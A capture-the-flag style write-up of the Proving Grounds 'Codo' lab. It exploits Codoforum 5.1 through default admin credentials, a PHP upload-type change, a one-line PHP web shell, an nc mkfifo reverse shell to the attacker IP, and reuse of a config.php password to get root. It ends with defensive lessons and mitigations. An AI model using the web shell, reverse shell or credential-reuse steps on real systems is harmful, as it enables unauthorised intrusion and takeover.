# Codo(linux) — Proving Grounds Writeup
 
**Platform:** Proving Grounds Practice

**OS:** Linux (Ubuntu)

**Difficulty:** Easy

**CVE:** CVE-2022-31854

**Job Role:** Junior Penetration Tester / Bug Bounty Hunter

**Tags:** Default Credentials · File Upload Bypass · PHP Web Shell · Credential Reuse · Privilege Escalation
 
---
 
## Table of Contents
 
1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration — Directory Discovery & Web Application](#enumeration--directory-discovery--web-application)
4. [Admin Panel Access — Default Credentials](#admin-panel-access--default-credentials)
5. [Exploitation — PHP File Upload Bypass](#exploitation--php-file-upload-bypass)
6. [Initial Access — Web Shell to Reverse Shell](#initial-access--web-shell-to-reverse-shell)
7. [Privilege Escalation — Config File Credential Reuse](#privilege-escalation--config-file-credential-reuse)
8. [Flags](#flags)
9. [Attack Chain](#-attack-chain)
10. [Skills Demonstrated](#-skills-demonstrated)
11. [Lessons Learned](#-lessons-learned)
12. [References](#references)
---
 
## Lab Overview
 
> *"In this lab, we will perform web enumeration to discover potential vulnerabilities, focusing on malicious file upload techniques. After identifying the vulnerabilities, we will exploit a file upload functionality to gain initial access to the system. This lab teaches skills in vulnerability discovery and the exploitation of file upload flaws to compromise a system."*
 
**Key Objectives:**
- Enumerate the web application to identify Codoforum running on port 80
- Access the admin panel using default credentials (`admin:admin`)
- Bypass file upload restrictions to upload a malicious PHP web shell
- Obtain a reverse shell as `www-data` via the uploaded shell
- Escalate privileges to root by extracting and reusing credentials from config files
---
 
## Reconnaissance
 
### Nmap Scan
 
```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.217.23
```

 <img width="1682" height="785" alt="image" src="https://github.com/user-attachments/assets/b82e02ad-ef93-426a-becc-8b93e3a9e32b" />

 
**Ports Discovered:**
 
| Port | State | Service | Version / Notes |
|------|-------|---------|-----------------|
| 22 | open | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 |
| 80 | open | HTTP | Apache httpd 2.4.41 (Ubuntu) |
 
**Key Nmap Findings:**
- HTTP title: **All topics \| CODOLOGIC** — confirms Codoforum application
- HTTP server header: `Apache/2.4.41 (Ubuntu)`
- Cookie flag: `PHPSESSID` — **httponly flag not set** (XSS session theft risk)
- OS fingerprint: Linux 4.X / 5.X — general purpose device
---
 
## Enumeration — Directory Discovery & Web Application
 
### Directory Enumeration with Dirsearch
 
Apache web server confirmed on port 80 — begin directory enumeration:
 
```bash
python3 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py \
  -u http://192.168.217.23 \
  -x 403,404,400,500,302,301
```
 
<img width="1679" height="647" alt="image" src="https://github.com/user-attachments/assets/38d9554d-6672-48c7-80a1-95d3d6a57f1c" />

 
**Key Directories Discovered:**
 
| Status | Size | Path |
|--------|------|------|
| 200 | 105B | `/.babelrc` |
| 200 | 2KB | `/admin/` |
| 200 | 2KB | `/admin/index.php` |
| 200 | 1KB | `/admin/login.php` |
| 200 | 486B | `/cache/` |
| 200 | 4KB | `/index.php/login/` |
| 200 | 8KB | `/index.php` |
| 200 | 24KB | `/README.md` |
 
> **Key Finding:** `/admin/` directory is publicly accessible — no authentication prompt on the path itself, only on the login form.
 
### Codoforum Web Application
 
Visiting `http://192.168.217.23` reveals a **Codoforum** installation — a free, PHP-based forum and community discussion platform.
 
<img width="1337" height="820" alt="image" src="https://github.com/user-attachments/assets/be619c02-534a-42e4-9963-74336808f87f" />

 
Quick research confirms that Codoforum v5.1 is affected by **CVE-2022-31854** — an authenticated Remote Code Execution vulnerability via file upload.
 
---
 
## Admin Panel Access — Default Credentials
 
### Step 1 — Login to /admin
 
Navigating to `http://192.168.217.23/admin/index.php`:
 
```
Username: admin
Password: admin
```
 
<img width="1617" height="704" alt="image" src="https://github.com/user-attachments/assets/60294823-36ee-46a7-abe9-eb4d1077d0fa" />

 
Default credentials `admin:admin` grant immediate access to the admin control panel (CF-ACP).
 
**Dashboard confirms:**
- **Current version: V.5.1.105**
- New version available: v5.4.1
- 1 post, 2 user registrations, 1 topic
> **CVE-2022-31854** is confirmed applicable — however, rather than using the automated exploit, we exploit the upload functionality **manually** for a cleaner, more controlled attack path.
 
**Automated Exploit Reference (not used):**
- https://www.exploit-db.com/exploits/50978 — CodoForum v5.1 RCE
---
 
## Exploitation — PHP File Upload Bypass
 
### Step 2 — Modify Upload Settings via Admin Panel
 
Navigate to: `http://192.168.217.23/admin/index.php?page=config`
 
<img width="998" height="811" alt="image" src="https://github.com/user-attachments/assets/14e5f26a-cbc8-4d23-a969-e9c3257a39de" />

 
Modify the following fields:
 
| Field | Original Value | New Value |
|-------|----------------|-----------|
| **Allowed Upload types** | (image types) | `php` |
| **Allowed Mimetypes** | (image mimetypes) | *(blank — cleared)* |
 
> **Reasoning:** By adding `php` to the allowed upload types and clearing all MIME type restrictions, the application's upload handler will accept raw PHP files without any content-type validation.
 
### Step 3 — Create the PHP Web Shell
 
```bash
nano shell.php
```
 
```php
<?php system($_GET["cmd"]); ?>
```
 
```bash
cat shell.php
# <?php system($_GET["cmd"]); ?>
```
 
<img width="546" height="184" alt="image" src="https://github.com/user-attachments/assets/92c9da1c-dbbe-42fe-901c-6c908bd4791b" />

 
### Step 4 — Upload the Web Shell
 
Navigate to the "Upload logo for your forum" feature in admin settings and upload `shell.php`.
 
**Screenshot — Shell Uploaded via Logo Upload:**
 
<img width="812" height="570" alt="image" src="https://github.com/user-attachments/assets/694c1c31-8613-4aa8-a137-5ab57eb01b38" />

 
The shell is stored at the predictable path:
 
```
/sites/default/assets/img/attachments/shell.php
```
 
---
 
## Initial Access — Web Shell to Reverse Shell
 
### Step 5 — Verify Code Execution
 
Test the web shell with a basic `id` command:
 
```
http://192.168.217.23/sites/default/assets/img/attachments/shell.php?cmd=id
```
 
Code execution confirmed as `www-data`.
 
### Step 6 — Generate URL-Encoded Reverse Shell
 
Using revshells.com with the **nc mkfifo** payload, URL-encoded for safe delivery via GET parameter:
 
**Screenshot — Revshells.com Payload Generator:**
 
<img width="1133" height="751" alt="image" src="https://github.com/user-attachments/assets/9e89e445-ef69-455a-8fcc-db32d132a3c6" />

 
```
Attacker IP:   192.168.45.169
Port:          4444
Shell type:    sh
Encoding:      URL Encode
```
 
### Step 7 — Set Up Listener and Trigger Shell
 
```bash
nc -lvnp 4444
```
 
Trigger the reverse shell via the web shell URL:
 
```
http://192.168.217.23/sites/default/assets/img/attachments/shell.php?cmd=rm%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.169%204444%20%3E%2Ftmp%2Ff
```
 
Decoded payload:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.169 4444 >/tmp/f
```
 
<img width="1133" height="751" alt="image" src="https://github.com/user-attachments/assets/20a88b66-2763-435c-a9f3-1dcdfae885be" />

 
```
listening on [any] 4444 ...
connect to [192.168.45.169] from (UNKNOWN) [192.168.217.23]
www-data@codo:/var/www/html$
```
 
**Initial shell obtained as `www-data`.**
 
---
 
## Privilege Escalation — Config File Credential Reuse
 
### Step 8 — Check /etc/passwd for Users
 
```bash
cat /etc/passwd | grep -E "bash|sh$"
```
 
Users identified: **root** and **offsec**
 
### Step 9 — Extract Database Credentials from config.php
 
Web application config files frequently contain plaintext credentials. Checking the Codoforum configuration:
 
```bash
ww-data@codo:/var/www/html/sites/default$ cat config.php
```

 <img width="542" height="95" alt="image" src="https://github.com/user-attachments/assets/f3a9830c-7277-42c6-a39b-ba4b83fcddb5" />

 
```php
'database' => 'codoforumdb',
'username' => 'codo',
'password' => 'FatPanda123',
'prefix'   => '',
```
 
**Credentials found:**
```
username : codo
password : FatPanda123
```
 
### Step 10 — Privilege Escalation via Password Reuse
 
Test the database password against the `root` system account:
 
```bash
su root
Password: FatPanda123
```
 
**Screenshot — Root Shell via su:**
 
<img width="574" height="152" alt="image" src="https://github.com/user-attachments/assets/917a3c24-5830-491f-9244-785158bc6b2d" />

 
```bash
id
uid=0(root) gid=0(root) groups=0(root)
```
 
**Root access confirmed via password reuse!**
 
---
 
## Flags
 
### local.txt (No local.txt flag)
 
```bash
cat /home/offsec/local.txt
# (flag value)
```
 
### proof.txt
 
```bash
cat /root/proof.txt
b52e1631b917d308bbc9742b6aed902d
```
 
<img width="484" height="105" alt="image" src="https://github.com/user-attachments/assets/bd963fc8-c81d-46e7-a79e-6f912054b0d3" />

 
---
 
## 🗺️ Attack Chain
 
```
Target: 192.168.217.23
│
├── [Reconnaissance] nmap -sC -sV -sS -A -T5 -p- -Pn
│       ├── Port 22: SSH (OpenSSH 8.2p1 Ubuntu)
│       └── Port 80: HTTP Apache 2.4.41 — title: "All topics | CODOLOGIC"
│               └── PHPSESSID httponly flag NOT set
│
├── [Enumeration] Directory Discovery + Web App Identification
│       ├── dirsearch → /admin/, /admin/index.php, /admin/login.php
│       ├── Visiting port 80 → Codoforum (free PHP forum software)
│       └── Version identified: V.5.1.105 (CVE-2022-31854 applicable)
│
├── [Admin Access] Default Credential Login
│       ├── http://192.168.217.23/admin/index.php
│       ├── admin:admin → SUCCESSFUL login
│       └── Full admin control panel (CF-ACP) access granted
│
├── [Exploit] PHP File Upload Bypass (Manual Method)
│       ├── Admin → Settings → Config → page=config
│       ├── Changed: Allowed Upload types → "php"
│       ├── Changed: Allowed Mimetypes → (blank)
│       ├── Created: shell.php → <?php system($_GET["cmd"]); ?>
│       └── Uploaded via: "Upload logo for your forum" feature
│               → Stored at: /sites/default/assets/img/attachments/shell.php
│
├── [Initial Access] Web Shell → Reverse Shell
│       ├── Verified RCE: ?cmd=id → www-data
│       ├── Generated URL-encoded nc mkfifo payload (revshells.com)
│       ├── Listener: nc -lvnp 4444
│       ├── Triggered: shell.php?cmd=<URL-encoded-revshell>
│       └── Reverse shell received as: www-data@codo
│
├── [Post-Exploitation] Config File Enumeration
│       ├── /etc/passwd → users: root, offsec
│       ├── cat /var/www/html/sites/default/config.php
│       └── Found: username=codo, password=FatPanda123
│
└── [Privilege Escalation] Credential Reuse → Root
        ├── su root → Password: FatPanda123
        ├── id → uid=0(root) gid=0(root) groups=0(root)
        └── proof.txt: b52e1631b917d308bbc9742b6aed902d ✅
```
 
---
 
## 🛡️ Skills Demonstrated
 
| Skill | Application | MITRE ATT&CK |
|-------|-------------|--------------|
| **Network Reconnaissance** | nmap full scan identifying Apache and SSH services | T1046 — Network Service Scanning |
| **Web Directory Enumeration** | Used dirsearch to discover /admin panel and application paths | T1595.003 — Wordlist Scanning |
| **Web Application Fingerprinting** | Identified Codoforum v5.1.105 and matched against known CVEs | T1592 — Gather Victim Host Information |
| **Default Credential Attack** | Accessed admin panel using `admin:admin` without brute force | T1110.001 — Password Guessing |
| **Input Validation Bypass** | Modified server-side upload restrictions via admin panel | T1190 — Exploit Public-Facing Application |
| **Malicious File Upload (PHP Shell)** | Uploaded PHP web shell by abusing file type configuration | T1505.003 — Web Shell |
| **Web Shell Command Execution** | Used `system($_GET["cmd"])` for arbitrary OS command execution | T1059.004 — Unix Shell |
| **URL-Encoded Reverse Shell Delivery** | Generated and delivered URL-encoded mkfifo reverse shell payload | T1027 — Obfuscated Files or Information |
| **Configuration File Analysis** | Extracted plaintext database credentials from config.php | T1552.001 — Credentials in Files |
| **Credential Reuse (Linux)** | Reused DB password against root system account via `su` | T1078 — Valid Accounts |
| **Web Application Security (OWASP)** | A01: Broken Access Control, A05: Security Misconfiguration, A07: Auth Failures | OWASP Top 10 |
| **Penetration Testing Methodology** | Full attack chain: recon → enumeration → exploit → shell → root | — |
 
---
 
## 📚 Lessons Learned
 
### 🔴 For Attackers (Pentesters)
 
- **Always test default credentials first.** `admin:admin`, `admin:password`, `admin:<appname>` take seconds to try and work far more often than expected. Never skip this step before running a brute force.
- **Admin panels that allow file type configuration are dangerous.** If an admin can change what file types are "allowed," an attacker with admin access can whitelist PHP and turn a logo upload into RCE. Check every settings page.
- **Dirsearch over ffuf for speed, ffuf for depth.** Run dirsearch first for rapid discovery, then background ffuf with a larger wordlist. The `/admin` path discovery here was immediate.
- **Manual exploitation beats automated tools for learning.** Rather than using EDB-50978 (automated exploit), manually modifying the upload settings demonstrates deeper understanding and is more transferable to real engagements.
- **Web shell placement matters.** The uploaded file is at a predictable path under `/sites/default/assets/img/attachments/` — always check the framework's default attachment/upload directories when looking for uploaded shells.
- **Config files in web roots almost always have database credentials.** After getting initial shell access, `cat config.php`, `config.inc.php`, `.env`, `wp-config.php` in the webroot should be the first commands run.
- **Database credentials frequently work as OS credentials.** Password reuse between database users and system accounts (`root`, `admin`, `www-data`) is extremely common in lab environments and surprisingly common in real-world targets.
- **URL-encode reverse shell payloads for GET delivery.** Raw shell characters (`&`, `|`, `;`, `>`) break the URL — always URL-encode when delivering payloads via query parameters. Revshells.com has a built-in URL Encode option.
### 🔵 For Defenders
 
- **Change default credentials immediately on installation.** `admin:admin` is the first thing every attacker tries. Enforce a mandatory password change on first admin login.
- **Never allow PHP file uploads through the web application.** Restrict upload types to safe formats only (jpg, png, gif, pdf). MIME type validation alone is insufficient — validate file extension AND magic bytes.
- **Implement server-side upload validation independently of admin settings.** Upload restrictions should be enforced at the server/framework level, not configurable via a UI setting that could be changed by a compromised admin account.
- **Store configuration files outside the web root.** `config.php` containing database credentials should never be accessible from the web directory. Place it above the web root and reference it via absolute path.
- **Enable `httponly` and `Secure` flags on all session cookies.** The nmap scan revealed PHPSESSID lacks the `httponly` flag — this exposes session tokens to JavaScript-based theft via XSS.
- **Apply least privilege to database users.** The `codo` database user should only have SELECT/INSERT/UPDATE on the forum database — never use a DB user as an OS account password.
- **Disable or restrict the admin panel by IP.** The `/admin` directory was publicly accessible. Use `.htaccess`, firewall rules, or VPN-only access to restrict the admin panel to trusted IPs.
- **Keep CMS software patched and updated.** The dashboard even showed "New version available: v5.4.1" — update notifications that are ignored are a sign of poor patch management.
- **Implement a Web Application Firewall (WAF).** A WAF would block PHP file upload attempts and URL-encoded reverse shell payloads, adding a layer of defense against both initial access and payload delivery.
- **Monitor file system changes in web directories.** Any new file appearing in `/sites/default/assets/img/attachments/` with a `.php` extension should trigger an immediate alert.
### 🟡 Key Vulnerabilities Summary
 
| Vulnerability | Root Cause | Severity | Impact | Mitigation |
|---------------|-----------|----------|--------|-----------|
| **Default Admin Credentials** | No forced password change on install | Critical | Unauthorized admin access | Enforce credential change on first login |
| **Unrestricted PHP File Upload** | Admin-configurable file type allowlist | Critical | Remote Code Execution as www-data | Server-side whitelist; block PHP uploads entirely |
| **Admin Upload Config Modifiable** | No separation between app config and security policy | High | Full upload bypass | Hardcode security restrictions server-side |
| **Credentials in Web Root Config** | config.php stored in web-accessible path | High | Database credential disclosure | Move config outside web root |
| **Password Reuse (DB → OS)** | Same password for database user and root | Critical | Full privilege escalation to root | Enforce unique credentials per service |
| **Missing Cookie Security Flags** | httponly not set on PHPSESSID | Medium | Session token theft via XSS | Set httponly + Secure flags on all session cookies |
| **Unpatched Software** | Codoforum v5.1.105 (CVE-2022-31854) | High | Authenticated RCE | Update to latest patched version |
 
---
 
## References
 
- [CVE-2022-31854 — CodoForum v5.1 RCE (Exploit-DB 50978)](https://www.exploit-db.com/exploits/50978)
- [Codoforum GitHub Repository](https://github.com/shivammathur/codoforum)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [MITRE ATT&CK — T1505.003: Web Shell](https://attack.mitre.org/techniques/T1505/003/)
- [MITRE ATT&CK — T1110.001: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK — T1552.001: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/)
- [Revshells.com — Reverse Shell Generator](https://www.revshells.com/)
---
 
## Tools Used
 
| Tool | Purpose |
|------|---------|
| `nmap` | Network reconnaissance and service fingerprinting |
| `dirsearch` | Web directory and file enumeration |
| Browser DevTools | Admin panel interaction and upload config modification |
| `nano` / `cat` | PHP web shell creation |
| `revshells.com` | URL-encoded reverse shell payload generation |
| `nc` (netcat) | Reverse shell listener |
| `su` | Privilege escalation via password reuse |
 
---
 
**Platform:** OffSec Proving Grounds Practice

**Author:** Tanvir Ahmed 
